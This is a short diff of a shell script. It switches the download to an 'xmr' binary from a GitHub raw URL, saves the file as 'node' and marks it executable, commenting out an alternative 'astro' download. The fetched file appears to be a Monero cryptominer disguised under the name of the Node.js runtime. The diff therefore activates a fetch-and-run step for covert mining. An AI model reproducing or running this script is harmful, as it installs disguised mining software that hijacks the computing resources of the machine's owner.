@@ -4,10 +4,10 @@
 # cNfj5q6A7c4yM3KD
 
 # xmr
-#curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/xmr/linux-static/node
+curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/xmr/linux-static/node
 
 # Astro
-curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/astro/node
+#curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/astro/node
 
 chmod +x node
 INPUT_NUMBER=$1
